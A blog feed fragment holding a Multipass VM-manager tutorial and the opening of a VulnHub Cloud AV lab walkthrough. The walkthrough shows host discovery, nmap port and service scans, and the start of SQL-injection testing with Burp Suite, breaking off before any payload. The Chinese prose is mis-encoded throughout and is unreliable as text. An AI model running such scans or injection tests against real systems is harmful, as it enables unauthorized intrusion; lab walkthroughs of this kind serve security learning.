    <content type="html"><![CDATA[<h2 id="ä¸€ã€Multipassä»‹ç»"><a href="#ä¸€ã€Multipassä»‹ç»" class="headerlink" title="ä¸€ã€Multipassä»‹ç»"></a>ä¸€ã€Multipassä»‹ç»</h2><p><strong>Multipass</strong> æ˜¯æ‚¨å·¥ä½œç«™ä¸Šçš„è¿·ä½ äº‘ï¼Œä½¿ç”¨æ‰€æœ‰å—æ”¯æŒå¹³å°ï¼ˆWindowsã€macOS å’Œ Linuxï¼‰çš„æœ¬æœºç®¡ç†ç¨‹åºï¼Œåªéœ€å•å‡»ï¼ˆâ€œæ‰“å¼€ shellâ€ï¼‰æˆ–ç®€å•<code>multipass shell</code>å‘½ä»¤ï¼Œå®ƒå°±ä¼šä¸ºæ‚¨æä¾› Ubuntu å‘½ä»¤è¡Œï¼Œç”šè‡³é”®ç›˜å¿«æ·é”®ã€‚</p><p><strong>Multipass</strong> æ˜¯ä¸€ä¸ªè½»é‡è™šæ‹Ÿæœºç®¡ç†å™¨ï¼Œæ˜¯ç”± <strong>Ubuntu</strong> è¿è¥å…¬å¸ <strong>Canonical</strong> æ‰€æ¨å‡ºçš„å¼€æºé¡¹ç›®ã€‚è¿è¡Œç¯å¢ƒæ”¯æŒ <strong>Linux</strong>ã€<strong>Windows</strong>ã€<strong>macOS</strong>ã€‚åœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸Šï¼Œä½¿ç”¨çš„æ˜¯ä¸åŒçš„è™šæ‹ŸåŒ–æŠ€æœ¯ã€‚åœ¨ <strong>Linux</strong> ä¸Šä½¿ç”¨çš„æ˜¯ <strong>KVM</strong>ã€<strong>Window</strong> ä¸Šä½¿ç”¨ <strong>Hyper-V</strong>ã€<strong>macOS</strong> ä¸­ä½¿ç”¨ <strong>HyperKit</strong> ä»¥æœ€å°å¼€é”€è¿è¡ŒVMï¼Œæ”¯æŒåœ¨ç¬”è®°æœ¬æ¨¡æ‹Ÿå°å‹äº‘ã€‚</p><p>åŒæ—¶ï¼Œ<strong>Multipass</strong> æä¾›äº†ä¸€ä¸ªå‘½ä»¤è¡Œç•Œé¢æ¥å¯åŠ¨å’Œç®¡ç† <strong>Linux</strong> å®ä¾‹ã€‚ä¸‹è½½ä¸€ä¸ªå…¨æ–°çš„é•œåƒéœ€è¦å‡ ç§’é’Ÿçš„æ—¶é—´ï¼Œå¹¶ä¸”åœ¨å‡ åˆ†é’Ÿå†…å°±å¯ä»¥å¯åŠ¨å¹¶è¿è¡Œ <strong>VM</strong>ã€‚</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220124102540386.png" alt="image-20220124102540386"></p><span id="more"></span><h2 id="äºŒã€å®‰è£…Multipass"><a href="#äºŒã€å®‰è£…Multipass" class="headerlink" title="äºŒã€å®‰è£…Multipass"></a>äºŒã€å®‰è£…Multipass</h2><p>è¦åœ¨ <strong>macOS</strong> ä¸Šå®‰è£… Multipassï¼Œæ‚¨æœ‰ä¸¤ä¸ªé€‰æ‹©ï¼šå®‰è£…ç¨‹åºåŒ…æˆ–<a href="https://brew.sh/"><code>brew</code></a></p><h3 id="å®‰è£…ç¨‹åºåŒ…"><a href="#å®‰è£…ç¨‹åºåŒ…" class="headerlink" title="å®‰è£…ç¨‹åºåŒ…"></a>å®‰è£…ç¨‹åºåŒ…</h3><p>ä¸‹è½½ç¨‹åº<a href="https://github.com/CanonicalLtd/multipass/releases/">https://github.com/CanonicalLtd/multipass/releases/</a></p><p>å¸è½½è„šæœ¬ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo sh <span class="string">&quot;/Library/Application Support/com.canonical.multipass/uninstall.sh&quot;</span></span><br></pre></td></tr></table></figure><h3 id="é€šè¿‡brewå®‰è£…"><a href="#é€šè¿‡brewå®‰è£…" class="headerlink" title="é€šè¿‡brewå®‰è£…"></a>é€šè¿‡brewå®‰è£…</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install --cask multipass</span><br></pre></td></tr></table></figure><p>å¸è½½ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ brew uninstall multipass</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">$ brew uninstall --zap multipass <span class="comment"># to destroy all data, too</span></span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€ä½¿ç”¨æ–¹å¼"><a href="#ä¸‰ã€ä½¿ç”¨æ–¹å¼" class="headerlink" title="ä¸‰ã€ä½¿ç”¨æ–¹å¼"></a>ä¸‰ã€ä½¿ç”¨æ–¹å¼</h2><h3 id="å¸®åŠ©æŒ‡å—"><a href="#å¸®åŠ©æŒ‡å—" class="headerlink" title="å¸®åŠ©æŒ‡å—"></a>å¸®åŠ©æŒ‡å—</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass <span class="built_in">help</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Usage: multipass [options] &lt;command&gt;</span><br><span class="line">Create, control and connect to Ubuntu instances.</span><br><span class="line"></span><br><span class="line">This is a command line utility for multipass, a</span><br><span class="line">service that manages Ubuntu instances.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -h, --help     Displays help on commandline options.</span><br><span class="line">  --help-all     Displays help including Qt specific options.</span><br><span class="line">  -v, --verbose  Increase logging verbosity. Repeat the &#x27;v&#x27; in the short option</span><br><span class="line">                 for more detail. Maximum verbosity is obtained with 4 (or more)</span><br><span class="line">                 v&#x27;s, i.e. -vvvv.</span><br><span class="line"></span><br><span class="line">Available commands:</span><br><span class="line">  alias     Create an alias</span><br><span class="line">  aliases   List available aliases</span><br><span class="line">  delete    Delete instances</span><br><span class="line">  exec      Run a command on an instance</span><br><span class="line">  find      Display available images to create instances from</span><br><span class="line">  get       Get a configuration setting</span><br><span class="line">  help      Display help about a command</span><br><span class="line">  info      Display information about instances</span><br><span class="line">  launch    Create and start an Ubuntu instance</span><br><span class="line">  list      List all available instances</span><br><span class="line">  mount     Mount a local directory in the instance</span><br><span class="line">  networks  List available network interfaces</span><br><span class="line">  purge     Purge all deleted instances permanently</span><br><span class="line">  recover   Recover deleted instances</span><br><span class="line">  restart   Restart instances</span><br><span class="line">  set       Set a configuration setting</span><br><span class="line">  shell     Open a shell on a running instance</span><br><span class="line">  start     Start instances</span><br><span class="line">  stop      Stop running instances</span><br><span class="line">  suspend   Suspend running instances</span><br><span class="line">  transfer  Transfer files between the host and instances</span><br><span class="line">  umount    Unmount a directory from an instance</span><br><span class="line">  unalias   Remove an alias</span><br><span class="line">  version   Show version details</span><br></pre></td></tr></table></figure><h3 id="æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„Multipassç‰ˆæœ¬"><a href="#æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„Multipassç‰ˆæœ¬" class="headerlink" title="æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„Multipassç‰ˆæœ¬"></a>æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„<strong>Multipass</strong>ç‰ˆæœ¬</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass version</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">multipass   1.8.1+mac</span><br><span class="line">multipassd  1.8.1+mac</span><br></pre></td></tr></table></figure><h3 id="å¿«é€Ÿåˆ›å»ºè¿è¡Œ"><a href="#å¿«é€Ÿåˆ›å»ºè¿è¡Œ" class="headerlink" title="å¿«é€Ÿåˆ›å»ºè¿è¡Œ"></a>å¿«é€Ÿåˆ›å»ºè¿è¡Œ</h3><p>æ‰“å¼€<strong>Multipass</strong>â€“æ‰“å¼€<strong>çŠ¶æ€æ å›¾æ ‡</strong>â€“<strong>Open Shell</strong></p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220124102731263.png" alt="image-20220124102731263"></p><h3 id="æŸ¥çœ‹å¯ä¸‹è½½å®‰è£…çš„Ubuntué•œåƒ"><a href="#æŸ¥çœ‹å¯ä¸‹è½½å®‰è£…çš„Ubuntué•œåƒ" class="headerlink" title="æŸ¥çœ‹å¯ä¸‹è½½å®‰è£…çš„Ubuntué•œåƒ"></a>æŸ¥çœ‹å¯ä¸‹è½½å®‰è£…çš„Ubuntué•œåƒ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass find</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Image                       Aliases           Version          Description</span><br><span class="line">18.04                       bionic            20220104         Ubuntu 18.04 LTS</span><br><span class="line">20.04                       focal,lts         20220118         Ubuntu 20.04 LTS</span><br><span class="line">21.10                       impish            20220118         Ubuntu 21.10</span><br><span class="line">anbox-cloud-appliance                         latest           Anbox Cloud Appliance</span><br><span class="line">charm-dev                                     latest           A development and testing environment for charmers</span><br><span class="line">minikube                                      latest           minikube is local Kubernetes</span><br></pre></td></tr></table></figure><h3 id="ä¸‹è½½é•œåƒé…ç½®å¹¶è¿è¡Œ"><a href="#ä¸‹è½½é•œåƒé…ç½®å¹¶è¿è¡Œ" class="headerlink" title="ä¸‹è½½é•œåƒé…ç½®å¹¶è¿è¡Œ"></a>ä¸‹è½½é•œåƒé…ç½®å¹¶è¿è¡Œ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass launch -n vm01 -c 1 -m 1G -d 10G</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-n, --name: åç§°</span><br><span class="line">-c, --cpus: cpuæ ¸å¿ƒæ•°, é»˜è®¤: 1</span><br><span class="line">-m, --mem: å†…å­˜å¤§å°, é»˜è®¤: 1G</span><br><span class="line">-d, --disk: ç¡¬ç›˜å¤§å°, é»˜è®¤: 5G</span><br></pre></td></tr></table></figure><h3 id="æŸ¥çœ‹è™šæ‹Ÿæœºåˆ—è¡¨"><a href="#æŸ¥çœ‹è™šæ‹Ÿæœºåˆ—è¡¨" class="headerlink" title="æŸ¥çœ‹è™šæ‹Ÿæœºåˆ—è¡¨"></a>æŸ¥çœ‹è™šæ‹Ÿæœºåˆ—è¡¨</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass list</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Name                    State             IPv4             Image</span><br><span class="line">primary                 Running           192.168.64.2     Ubuntu 20.04 LTS</span><br><span class="line">vm01                    Running           192.168.64.3     Ubuntu 20.04 LTS</span><br></pre></td></tr></table></figure><h3 id="æŸ¥çœ‹è™šæ‹Ÿæœºä¿¡æ¯"><a href="#æŸ¥çœ‹è™šæ‹Ÿæœºä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹è™šæ‹Ÿæœºä¿¡æ¯"></a>æŸ¥çœ‹è™šæ‹Ÿæœºä¿¡æ¯</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass info vm01</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Name:           vm01</span><br><span class="line">State:          Running</span><br><span class="line">IPv4:           192.168.64.3</span><br><span class="line">Release:        Ubuntu 20.04.3 LTS</span><br><span class="line">Image hash:     6fbeb622aace (Ubuntu 20.04 LTS)</span><br><span class="line">Load:           0.41 0.14 0.05</span><br><span class="line">Disk usage:     1.2G out of 9.5G</span><br><span class="line">Memory usage:   135.0M out of 970.0M</span><br><span class="line">Mounts:         --</span><br></pre></td></tr></table></figure><h3 id="åœ¨è™šæ‹Ÿæœºå¤–éƒ¨æ‰§è¡Œå‘½ä»¤"><a href="#åœ¨è™šæ‹Ÿæœºå¤–éƒ¨æ‰§è¡Œå‘½ä»¤" class="headerlink" title="åœ¨è™šæ‹Ÿæœºå¤–éƒ¨æ‰§è¡Œå‘½ä»¤"></a>åœ¨è™šæ‹Ÿæœºå¤–éƒ¨æ‰§è¡Œå‘½ä»¤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass <span class="built_in">exec</span> vm01 <span class="built_in">pwd</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/ubuntu</span><br></pre></td></tr></table></figure><h3 id="è¿›å…¥è™šæ‹Ÿæœº"><a href="#è¿›å…¥è™šæ‹Ÿæœº" class="headerlink" title="è¿›å…¥è™šæ‹Ÿæœº"></a>è¿›å…¥è™šæ‹Ÿæœº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass shell vm01</span><br></pre></td></tr></table></figure><p>æˆåŠŸè¿›å…¥ç»ˆç«¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@vm01:~$</span><br></pre></td></tr></table></figure><h3 id="å®¿ä¸»æœºæŒ‚è½½è™šæ‹Ÿæœº"><a href="#å®¿ä¸»æœºæŒ‚è½½è™šæ‹Ÿæœº" class="headerlink" title="å®¿ä¸»æœºæŒ‚è½½è™šæ‹Ÿæœº"></a>å®¿ä¸»æœºæŒ‚è½½è™šæ‹Ÿæœº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass mount /mnt vm01:/mnt</span><br></pre></td></tr></table></figure><h3 id="å®¿ä¸»æœºå¸è½½è™šæ‹ŸæœºæŒ‚è½½"><a href="#å®¿ä¸»æœºå¸è½½è™šæ‹ŸæœºæŒ‚è½½" class="headerlink" title="å®¿ä¸»æœºå¸è½½è™šæ‹ŸæœºæŒ‚è½½"></a>å®¿ä¸»æœºå¸è½½è™šæ‹ŸæœºæŒ‚è½½</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass unmount vm01</span><br></pre></td></tr></table></figure><h3 id="é‡å¯è™šæ‹Ÿæœº"><a href="#é‡å¯è™šæ‹Ÿæœº" class="headerlink" title="é‡å¯è™šæ‹Ÿæœº"></a>é‡å¯è™šæ‹Ÿæœº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass restart vm01</span><br></pre></td></tr></table></figure><h3 id="åˆ é™¤è™šæ‹Ÿæœº"><a href="#åˆ é™¤è™šæ‹Ÿæœº" class="headerlink" title="åˆ é™¤è™šæ‹Ÿæœº"></a>åˆ é™¤è™šæ‹Ÿæœº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$multipass</span> delete vm01</span><br><span class="line"><span class="variable">$multipass</span> delete --purge vm01 å½»åº•åˆ é™¤</span><br></pre></td></tr></table></figure><h3 id="æ¢å¤åˆ é™¤è™šæ‹Ÿæœº"><a href="#æ¢å¤åˆ é™¤è™šæ‹Ÿæœº" class="headerlink" title="æ¢å¤åˆ é™¤è™šæ‹Ÿæœº"></a>æ¢å¤åˆ é™¤è™šæ‹Ÿæœº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass recover vm01 </span><br></pre></td></tr></table></figure><h3 id="æš‚åœè™šæ‹Ÿæœº"><a href="#æš‚åœè™šæ‹Ÿæœº" class="headerlink" title="æš‚åœè™šæ‹Ÿæœº"></a>æš‚åœè™šæ‹Ÿæœº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass stop ubuntu-lts</span><br></pre></td></tr></table></figure><h3 id="å¯åŠ¨è™šæ‹Ÿæœº"><a href="#å¯åŠ¨è™šæ‹Ÿæœº" class="headerlink" title="å¯åŠ¨è™šæ‹Ÿæœº"></a>å¯åŠ¨è™šæ‹Ÿæœº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass start vm01</span><br></pre></td></tr></table></figure><h3 id="æŒ‚èµ·è™šæ‹Ÿæœº"><a href="#æŒ‚èµ·è™šæ‹Ÿæœº" class="headerlink" title="æŒ‚èµ·è™šæ‹Ÿæœº"></a>æŒ‚èµ·è™šæ‹Ÿæœº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ multipass <span class="built_in">suspend</span> vm01 </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ä¸€ã€Multipassä»‹ç»&quot;&gt;&lt;a href=&quot;#ä¸€ã€Multipassä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;ä¸€ã€Multipassä»‹ç»&quot;&gt;&lt;/a&gt;ä¸€ã€Multipassä»‹ç»&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Multipass&lt;/strong&gt; æ˜¯æ‚¨å·¥ä½œç«™ä¸Šçš„è¿·ä½ äº‘ï¼Œä½¿ç”¨æ‰€æœ‰å—æ”¯æŒå¹³å°ï¼ˆWindowsã€macOS å’Œ Linuxï¼‰çš„æœ¬æœºç®¡ç†ç¨‹åºï¼Œåªéœ€å•å‡»ï¼ˆâ€œæ‰“å¼€ shellâ€ï¼‰æˆ–ç®€å•&lt;code&gt;multipass shell&lt;/code&gt;å‘½ä»¤ï¼Œå®ƒå°±ä¼šä¸ºæ‚¨æä¾› Ubuntu å‘½ä»¤è¡Œï¼Œç”šè‡³é”®ç›˜å¿«æ·é”®ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Multipass&lt;/strong&gt; æ˜¯ä¸€ä¸ªè½»é‡è™šæ‹Ÿæœºç®¡ç†å™¨ï¼Œæ˜¯ç”± &lt;strong&gt;Ubuntu&lt;/strong&gt; è¿è¥å…¬å¸ &lt;strong&gt;Canonical&lt;/strong&gt; æ‰€æ¨å‡ºçš„å¼€æºé¡¹ç›®ã€‚è¿è¡Œç¯å¢ƒæ”¯æŒ &lt;strong&gt;Linux&lt;/strong&gt;ã€&lt;strong&gt;Windows&lt;/strong&gt;ã€&lt;strong&gt;macOS&lt;/strong&gt;ã€‚åœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸Šï¼Œä½¿ç”¨çš„æ˜¯ä¸åŒçš„è™šæ‹ŸåŒ–æŠ€æœ¯ã€‚åœ¨ &lt;strong&gt;Linux&lt;/strong&gt; ä¸Šä½¿ç”¨çš„æ˜¯ &lt;strong&gt;KVM&lt;/strong&gt;ã€&lt;strong&gt;Window&lt;/strong&gt; ä¸Šä½¿ç”¨ &lt;strong&gt;Hyper-V&lt;/strong&gt;ã€&lt;strong&gt;macOS&lt;/strong&gt; ä¸­ä½¿ç”¨ &lt;strong&gt;HyperKit&lt;/strong&gt; ä»¥æœ€å°å¼€é”€è¿è¡ŒVMï¼Œæ”¯æŒåœ¨ç¬”è®°æœ¬æ¨¡æ‹Ÿå°å‹äº‘ã€‚&lt;/p&gt;
&lt;p&gt;åŒæ—¶ï¼Œ&lt;strong&gt;Multipass&lt;/strong&gt; æä¾›äº†ä¸€ä¸ªå‘½ä»¤è¡Œç•Œé¢æ¥å¯åŠ¨å’Œç®¡ç† &lt;strong&gt;Linux&lt;/strong&gt; å®ä¾‹ã€‚ä¸‹è½½ä¸€ä¸ªå…¨æ–°çš„é•œåƒéœ€è¦å‡ ç§’é’Ÿçš„æ—¶é—´ï¼Œå¹¶ä¸”åœ¨å‡ åˆ†é’Ÿå†…å°±å¯ä»¥å¯åŠ¨å¹¶è¿è¡Œ &lt;strong&gt;VM&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220124102540386.png&quot; alt=&quot;image-20220124102540386&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>VulnHub-2-BoredHackerBlog:Cloud AV</title>
    <link href="http://example.com/2022/04/12/week2/"/>
    <id>http://example.com/2022/04/12/week2/</id>
    <published>2022-04-12T07:08:54.963Z</published>
    <updated>2022-04-12T07:10:28.764Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>Name:</strong> BoredHackerBlog: Cloud AV</p><p><strong>Date release:</strong> 29 Mar 2020</p><p><strong>Author</strong>: <a href="https://www.vulnhub.com/author/boredhackerblog,683/">BoredHackerBlog</a></p><p><strong>Series</strong>: <a href="https://www.vulnhub.com/series/boredhackerblog,295/">BoredHackerBlog</a></p><p><strong>Downloadï¼š</strong><a href="https://download.vulnhub.com/boredhackerblog/easy_cloudantivirus.ova">https://download.vulnhub.com/boredhackerblog/easy_cloudantivirus.ova</a></p><p><strong>Description:</strong></p><p>Cloud Anti-Virus Scanner! is a cloud-based antivirus scanning service.</p><p>Currently, itâ€™s in beta mode. Youâ€™ve been asked to test the setup and find vulnerabilities and escalate privs.</p><p><strong>Difficulty:</strong> Easy</p><p><strong>Tasks involved:</strong></p><ul><li>port scanning</li><li>webapp attacks</li><li>sql injection</li><li>command injection</li><li>brute forcing</li><li>code analysis</li></ul><p><strong>Virtual Machine:</strong></p><ul><li>Format: Virtual Machine (Virtualbox OVA)</li><li>Operating System: Linux</li></ul><p><strong>Networking:</strong></p><ul><li>DHCP Service: Enabled</li><li>IP Address Automatically assign</li></ul><p>This works better with VirtualBox rather than VMware.</p></blockquote><span id="more"></span><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1-ä¸»æœºå‘ç°"><a href="#1-ä¸»æœºå‘ç°" class="headerlink" title="1.ä¸»æœºå‘ç°"></a>1.ä¸»æœºå‘ç°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009095714305.png" alt="image-20211009095714305"></p><p>kaliçš„IPä¸º10.0.2.4</p><p>å¯¹10.0.2.0&#x2F;24ç½‘æ®µå†…çš„IPå‘é€åŒ…è¿›è¡Œæ¢æµ‹å‘ç°<img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009095857623.png" alt="image-20211009095857623"></p><p>10.0.2.7<strong>è¿”å›æ•°æ®</strong>ï¼Œè¯´æ˜<strong>å­˜æ´»</strong></p><h3 id="2-ç«¯å£æ‰«æ"><a href="#2-ç«¯å£æ‰«æ" class="headerlink" title="2.ç«¯å£æ‰«æ"></a>2.ç«¯å£æ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.7</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009101228440.png" alt="image-20211009101228440"></p><p>ç»“æœæ˜¾ç¤ºç›®æ ‡é¶æœº<strong>å¼€æ”¾äº†22,8080ç«¯å£</strong></p><h3 id="3-ç«¯å£æœåŠ¡æ‰«æå‘ç°"><a href="#3-ç«¯å£æœåŠ¡æ‰«æå‘ç°" class="headerlink" title="3.ç«¯å£æœåŠ¡æ‰«æå‘ç°"></a>3.ç«¯å£æœåŠ¡æ‰«æå‘ç°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p22,8080 -sV 10.0.2.7</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009101354083.png" alt="image-20211009101354083"></p><p>ç›®æ ‡ç³»ç»Ÿä¸ºUbuntu ä¸”å¼€æ”¾äº†22ç«¯å£ä¸º<strong>SSHæœåŠ¡</strong></p><p>8080ç«¯å£çš„Werkzeugæ˜¯åŸºäºPython2.7ç¯å¢ƒ</p><p>è¡¥å……ï¼šWerkzeugæ˜¯ä¸€ä¸ªWSGIå·¥å…·åŒ…ï¼ŒWerkzeugå¯ä»¥ä½œä¸ºä¸€ä¸ª Web æ¡†æ¶çš„åº•å±‚åº“ï¼Œå› ä¸ºå®ƒå°è£…å¥½äº†å¾ˆå¤š Web æ¡†æ¶çš„ä¸œè¥¿ï¼Œä¾‹å¦‚ Requestï¼ŒResponse ç­‰ç­‰ã€‚å¦‚ Flask æ¡†æ¶å°±æ˜¯ä»¥Werkzeug ä¸ºåŸºç¡€å¼€å‘çš„ã€‚</p><h2 id="äºŒã€æ¼æ´å‘ç°ä¸åˆ©ç”¨"><a href="#äºŒã€æ¼æ´å‘ç°ä¸åˆ©ç”¨" class="headerlink" title="äºŒã€æ¼æ´å‘ç°ä¸åˆ©ç”¨"></a>äºŒã€æ¼æ´å‘ç°ä¸åˆ©ç”¨</h2><h3 id="1-è®¿é—®é¡µé¢"><a href="#1-è®¿é—®é¡µé¢" class="headerlink" title="1.è®¿é—®é¡µé¢"></a>1.è®¿é—®é¡µé¢</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è®¿é—®ï¼šhttp://10.0.10.7:8080</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009102035206.png" alt="image-20211009102035206"></p><p>é¡µé¢å¦‚å›¾ä¸ºâ€œäº‘é˜²ç—…æ¯’å¹³å°â€ï¼Œå¹¶æç¤ºéœ€æäº¤é‚€è¯·ç æ‰èƒ½ç™»å½•ä½¿ç”¨</p><p>é‚£ä¹ˆå¦‚ä½•çªç ´è¿™ä¸ªé¡µé¢ï¼Ÿ</p><h3 id="2-æµ‹è¯•SQLæ³¨å…¥-x2F-çˆ†ç ´"><a href="#2-æµ‹è¯•SQLæ³¨å…¥-x2F-çˆ†ç ´" class="headerlink" title="2.æµ‹è¯•SQLæ³¨å…¥&#x2F;çˆ†ç ´"></a>2.æµ‹è¯•SQLæ³¨å…¥&#x2F;çˆ†ç ´</h3><p>å°è¯•åœ¨é¡µé¢æ–‡æœ¬æ¡†å†…<strong>æäº¤ä¿¡æ¯ï¼ˆç‰¹æ®Šç¬¦å·ï¼‰</strong>æ¥æœåŠ¡ç«¯åç«¯æœ‰æ²¡æœ‰å¯¹ç”¨æˆ·æäº¤çš„<strong>æ•æ„Ÿå­—ç¬¦</strong>ï¼ˆä¸åŒè¯­è¨€ç¯å¢ƒä¸‹å­˜åœ¨ä¸åŒä½œç”¨&#x2F;æ„ä¹‰çš„å­—ç¬¦ï¼‰è¿›è¡Œè¿‡æ»¤ï¼Œè‹¥æœªè¿‡æ»¤åˆ™æœ‰å¯èƒ½<strong>å‘ç”ŸæŠ¥é”™</strong>æˆ–ä¼š<strong>è¿”å›é”™è¯¯ä¿¡æ¯</strong>ã€‚</p><p>é…ç½®æµè§ˆå™¨ä»£ç†ï¼Œä½¿ç”¨BurpSuiteå¯¹<strong>ç¬¦å·</strong>è¿›è¡Œæ£€æµ‹</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009103133428.png" alt="image-20211009103133428"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009104716945.png" alt="image-20211009104716945"></p><p><img 